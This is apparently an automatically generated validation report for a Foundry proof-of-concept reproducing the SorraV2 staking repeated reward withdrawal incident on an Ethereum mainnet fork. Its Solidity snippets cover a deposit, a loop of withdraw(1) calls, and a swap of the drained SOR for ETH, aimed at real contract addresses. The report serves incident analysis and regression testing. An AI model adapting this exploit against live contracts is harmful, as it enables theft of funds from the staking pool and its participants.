# SorraV2 Staking Repeated Reward Withdrawal – PoC Validation Report

## 1. Overview & Context

This proof-of-concept (PoC) reproduces the **SorraV2 / sorraStaking repeated reward withdrawal exploit** on an Ethereum mainnet fork.  
The underlying bug, as analyzed in `root_cause_report.md`, is that `sorraStaking.withdraw(uint256 _amount)` recomputes and pays **the full vested reward** every time it is called for a fully vested position, without tracking previously distributed rewards. By repeatedly calling `withdraw(1)` from a fully vested staking position, an adversary can drain SorraV2 (SOR) rewards multiple times and then swap the drained SOR for ETH via the SOR‑WETH Uniswap V2 pair.

The Forge PoC in `forge_poc/test/Exploit.sol`:

- Forks Ethereum mainnet at block **21550968** (the incident profit block).  
- Creates a fresh staker/attacker position in `sorraStaking`.  
- Replays the **repeated withdraw(1)** pattern against the live `sorraStaking` and SOR‑WETH pool.  
- Asserts that the attacker profits in **native ETH** and that the staking pool’s SOR balance decreases.

### How to Run the PoC

From the session root:

```bash
cd forge_poc
RPC_URL="<your_mainnet_rpc_url>" forge test --via-ir -vvvvv -m testExploit
```

- `RPC_URL` must be a **mainnet** RPC endpoint (the validation run used a QuickNode mainnet URL derived from the incident config).  
- The test `SorraStakingExploitTest::testExploit` should pass and emit a detailed trace, confirming the exploit and oracle conditions.

## 2. PoC Architecture & Key Contracts

The PoC is implemented in `forge_poc/test/Exploit.sol` as a single Foundry test contract:

- **`SorraStakingExploitTest`** (main test / adversary harness)  
  - Uses Foundry’s `Test` base contract and cheatcodes.  
  - Interacts directly with live mainnet contracts:
    - `sorraStaking` (victim staking contract): `0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50`  
    - `SorraV2` SOR token: `0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF`  
    - SOR‑WETH Uniswap V2 pair: `0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308`  
    - Uniswap V2 router: `0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`

Logical roles:

- `attacker`: fresh EOA derived as `vm.addr(1)` (no reuse of the real incident EOA).  
- `staker`: same as `attacker`, representing a staker with a large, fully vested SOR position.  
- The victim pool is `sorraStaking`, which holds SOR rewards to be drained.

Key state and helpers:

- `attackerEthBefore` – attacker’s ETH balance baseline before executing the exploit.  
- `poolSorBefore` – SOR balance of `sorraStaking` before the exploit.  
- Internal helper `_performExploit()` – encodes the repeated `withdraw(1)` pattern and swap to ETH.

### Representative Solidity Snippet – Test Skeleton

Origin: `forge_poc/test/Exploit.sol` (test contract structure).

```solidity
contract SorraStakingExploitTest is Test {
    address constant VICTIM_STAKING = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;
    address constant REWARD_TOKEN_SOR = 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF;
    address constant SOR_WETH_PAIR = 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308;
    address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ISorraStaking internal staking = ISorraStaking(VICTIM_STAKING);
    IERC20 internal sor = IERC20(REWARD_TOKEN_SOR);
    IUniswapV2Router02 internal router = IUniswapV2Router02(UNISWAP_V2_ROUTER);

    address internal attacker;
    address internal staker;

    uint256 internal attackerEthBefore;
    uint256 internal poolSorBefore;
}
```

*Caption: Main PoC test contract wiring mainnet addresses and roles.*

## 3. Adversary Execution Flow

The adversary execution is encoded in `setUp()` and `testExploit()` of `SorraStakingExploitTest`, with `_performExploit()` capturing the core exploit logic.

### 3.1 Environment Setup & Funding

Steps:

1. **Fork mainnet at incident block**  
   - Uses `vm.envString("RPC_URL")` and `vm.createSelectFork(rpcUrl, 21_550_968)` (block 21550968).  
   - Ensures the forked state matches the incident pre-state described in the root cause report.

2. **Create fresh attacker/staker identity**  
   - `attacker = vm.addr(1); staker = attacker;`  
   - Labeled as `"attacker"` and `"staker"` for trace readability.  
   - Avoids using real incident EOAs or contracts.

3. **Fund staker with SOR and create staking position**  
   - Uses Foundry’s `deal` cheatcode to assign SOR to `staker`.  
   - Approves `sorraStaking` and calls `deposit` with a large but clearly documented amount.

Representative snippet:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, 21_550_968);
    vm.selectFork(forkId);

    attacker = vm.addr(1);
    staker = attacker;

    uint256 depositAmount = 100_000 ether;
    deal(REWARD_TOKEN_SOR, staker, depositAmount);

    vm.startPrank(staker);
    sor.approve(VICTIM_STAKING, depositAmount);
    uint8 tier = 2; // 60-day tier
    staking.deposit(depositAmount, tier);
    vm.stopPrank();
}
```

*Caption: Forking mainnet, creating a fresh attacker/staker, and depositing 100k SOR into `sorraStaking`.*

4. **Ensure position is fully vested**  
   - Warps time forward by 61 days (`vm.warp(block.timestamp + 61 days)`) so tier‑2 rewards are fully vested.  
   - Confirms via oracle-style pre-checks that:
     - `positions(staker) > 0`  
     - `getPendingRewards(staker) > 0`

5. **Record oracle baselines**  
   - `attackerEthBefore = attacker.balance;`  
   - `poolSorBefore = sor.balanceOf(VICTIM_STAKING);`

### 3.2 Exploit Execution (Repeated Withdrawals)

The exploit proceeds entirely within a single test transaction:

1. **Record logs for event-based oracle**  
   - `vm.recordLogs()` before executing the exploit to later count `RewardDistributed` events.

2. **Repeated `withdraw(1)` calls**  
   - `_performExploit()` executes `staking.withdraw(1 ether)` in a loop (5 iterations) from the fully vested staker position.  
   - Each call recomputes the full vested reward and pays `_amount + full_reward`, exploiting the accounting bug.

3. **Swap drained SOR for ETH**  
   - After withdrawals, the attacker holds a SOR balance.  
   - Approves the Uniswap V2 router and calls `swapExactTokensForETHSupportingFeeOnTransferTokens` along the path `[SOR, WETH]`, targeting the SOR‑WETH pair.  
   - The router unwraps WETH to ETH and sends ETH directly to the `attacker` EOA.

Representative exploit snippet:

```solidity
function _performExploit() internal {
    vm.startPrank(staker);

    uint256 numIterations = 5;
    uint256 withdrawAmount = 1 ether;

    for (uint256 i; i < numIterations; i++) {
        staking.withdraw(withdrawAmount);
    }

    uint256 sorBalance = sor.balanceOf(staker);
    assertGt(sorBalance, 0, "staker should hold SOR after withdrawals");

    sor.approve(address(router), sorBalance);

    address[] memory path = new address[](2);
    path[0] = REWARD_TOKEN_SOR;
    path[1] = router.WETH();

    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        sorBalance,
        0,
        path,
        attacker,
        block.timestamp + 10 minutes
    );

    vm.stopPrank();
}
```

*Caption: Core exploit – repeated `withdraw(1)` calls followed by swapping drained SOR to ETH on the real SOR‑WETH pair.*

### 3.3 Profit Realization & Assertions

After executing `_performExploit()`, `testExploit()`:

- Scans recorded logs to count how many `RewardDistributed(staker, amount)` events were emitted by `sorraStaking`.  
- Asserts **at least two** reward events for the same staker within the same transaction.  
- Computes `attackerEthAfter` and ensures `attackerEthAfter > attackerEthBefore`.  
- Recomputes `poolSorAfter` and ensures `poolSorAfter < poolSorBefore`.

This captures both:

- The **logical exploit pattern** (repeated reward distribution for the same position), and  
- The **economic effect** (attacker ETH profit and victim pool SOR depletion).

## 4. Oracle Definitions and Checks

This PoC is explicitly aligned with `/artifacts/poc/oracle_generator/oracle_definition.json`, which defines:

### 4.1 Variables

- `attacker` – adversary address receiving ETH profit (fresh EOA via `vm.addr(1)`).  
- `staker` – address that owns the staking position, set equal to `attacker`.  
- `victim_staking` – `sorraStaking` contract (`0x5d16…7d50`).  
- `reward_token_sor` – SOR ERC‑20 token (`0xE021…88dF`).  
- `profit_token_eth` – ETH (native).  
- `sor_weth_pair` – SOR‑WETH Uniswap V2 pair (`0xA15C…d308`).

### 4.2 Pre-checks

The oracle specifies three pre-checks:

1. **Pool holds non-zero SOR**  
   - Asserts `IERC20(reward_token_sor).balanceOf(victim_staking) > 0`.  
   - Implemented as:

   ```solidity
   assertGt(
       sor.balanceOf(VICTIM_STAKING),
       0,
       "sorraStaking must hold SOR before exploit"
   );
   ```

2. **Staker has vested position with pending rewards**  
   - Asserts `positions(staker) > 0` and `getPendingRewards(staker) > 0`.  

   ```solidity
   uint256 totalAmountBefore = staking.positions(staker);
   assertGt(totalAmountBefore, 0, "staker must have positive position");
   assertGt(
       staking.getPendingRewards(staker),
       0,
       "staker must have pending rewards"
   );
   ```

3. **Record baselines for profit and depletion**  
   - Saves `attackerEthBefore` and `poolSorBefore` for later comparisons.

### 4.3 Hard Constraints

1. **ETH-based profit for attacker** (`hard_asset_type_eth_profit`)  
   - Oracle requirement: attacker must profit in native ETH.  
   - Implemented in `testExploit()`:

   ```solidity
   uint256 attackerEthAfter = attacker.balance;
   assertGt(
       attackerEthAfter,
       attackerEthBefore,
       "attacker must have strictly more ETH after exploit"
   );
   ```

2. **Repeated RewardDistributed events in a single tx** (`hard_repeated_reward_events_single_tx`)  
   - Oracle requirement: multiple `RewardDistributed` events for the same staker in one transaction.  
   - Implemented by recording logs, filtering for the `RewardDistributed(address,uint256)` signature, and counting events where the indexed user equals `staker`:

   ```solidity
   vm.recordLogs();
   _performExploit();
   Vm.Log[] memory logs = vm.getRecordedLogs();

   uint256 rewardEventsForStaker;
   bytes32 rewardDistributedSig =
       keccak256("RewardDistributed(address,uint256)");

   for (uint256 i; i < logs.length; i++) {
       if (logs[i].emitter == VICTIM_STAKING) {
           if (
               logs[i].topics.length > 1 &&
               logs[i].topics[0] == rewardDistributedSig &&
               address(uint160(uint256(logs[i].topics[1]))) == staker
           ) {
               rewardEventsForStaker++;
           }
       }
   }

   assertGe(
       rewardEventsForStaker,
       2,
       "exploit must trigger multiple RewardDistributed events for staker"
   );
   ```

### 4.4 Soft Constraints

1. **Attacker ETH profit delta** (`soft_attacker_eth_profit_delta`)  
   - Oracle calls for any strictly positive ETH profit, in the spirit of the ~4.6937 ETH gain observed on-chain.  
   - Implemented by the same `attackerEthAfter > attackerEthBefore` assertion, ensuring positive ETH delta without pinning to a specific amount.

2. **Victim SOR balance depletion** (`soft_victim_sor_depletion`)  
   - Oracle requires that `sorraStaking` lose SOR balance over the exploit.  
   - Implemented as:

   ```solidity
   uint256 poolSorAfter = sor.balanceOf(VICTIM_STAKING);
   assertLt(
       poolSorAfter,
       poolSorBefore,
       "sorraStaking must lose SOR during exploit"
   );
   ```

Collectively, these checks ensure the PoC matches both the **logical** and **economic** signatures of the incident as captured in `oracle_definition.json`.

## 5. Validation Result and Robustness

The validator executed the Forge PoC with a mainnet RPC URL and captured detailed traces in:

- `artifacts/poc/poc_validator/forge-test.log`

Key outcomes:

- All tests pass, including `SorraStakingExploitTest::testExploit`.  
- The trace shows:
  - A mainnet fork at block 21550968.  
  - Deposit of 100,000 SOR into `sorraStaking` for the staker.  
  - Multiple `RewardDistributed` and `Withdraw` events for the same staker during repeated `withdraw(1)` calls.  
  - Swapping drained SOR through the real SOR‑WETH pair and Uniswap V2 router, culminating in ETH being sent to the attacker EOA.

The validation result, written to `artifacts/poc/poc_validator/poc_validated_result.json`, is:

- `overall_status`: **`Pass`**  
- `poc_correctness_checks.passes_validation_oracles.passed`: **true**  
- All quality checks (oracle alignment, human readability and labeling, absence of attacker artifacts, mainnet fork usage, end-to-end attack flow, and alignment with root cause) are marked **true** with explicit reasoning.

In particular, the PoC:

- Runs **fully on a mainnet fork** with live contracts and pools (no mocks).  
- Uses **fresh adversary identities** (no real attacker EOA or helper contracts).  
- Provides **clear labels and comments** explaining roles and exploit flow.  
- Implements **all specified oracles** and demonstrates positive ETH profit plus SOR pool depletion.

## 6. Linking PoC Behavior to Root Cause

The PoC’s behavior closely mirrors the root cause described in `root_cause_report.md` for the **SorraV2 staking repeated reward withdrawal** incident:

- The original incident involved:
  - A large SOR staking position in `sorraStaking`.  
  - Helper/front-end contracts repeatedly calling `withdraw(1)` for a fully vested position.  
  - Multiple `RewardDistributed` events and substantial SOR outflows from `sorraStaking`.  
  - Swapping drained SOR through the SOR‑WETH pair to realize **ETH profit** for the adversary EOA.

The PoC reproduces this pattern with a clean, self-contained harness:

- **Deposit & vesting** – The test constructs a large SOR position and warps time so rewards are fully vested, matching the “fully vested position” precondition.  
- **Repeated withdrawals** – `_performExploit()` issues multiple `withdraw(1)` calls, each recomputing the full reward and paying `_amount + reward` from `sorraStaking`, reproducing the accounting bug.  
- **Event-level evidence** – The log-based oracle enforces that multiple `RewardDistributed` events target the same staker within one transaction, evidencing repeated reward realization.  
- **Economic outcome** – The PoC swaps drained SOR to ETH on the same SOR‑WETH pair used in the incident, and asserts that:
  - The attacker’s ETH balance increases (profit predicate in the ACT framing).  
  - The SOR balance of `sorraStaking` decreases (victim pool depletion).

In ACT terms:

- **Availability:** `deposit`, `withdraw`, and the SOR‑WETH pool are publicly accessible; the PoC uses only public interfaces on a mainnet fork.  
- **Control:** The attacker controls a fully vested staking position and can invoke `withdraw` repeatedly, just as in the incident.  
- **Targeting:** The victim is the global SOR staking pool (`sorraStaking`) and its participants; the PoC demonstrates draining rewards from this shared pool to benefit the attacker.

Overall, the validated PoC **faithfully and robustly** reproduces the sorraStaking repeated reward withdrawal exploit on a forked mainnet state, fully aligned with both the **root cause analysis** and the **oracle specification**. It can be used as a high-confidence regression test and as documentation of the exploit’s mechanics and impact. 

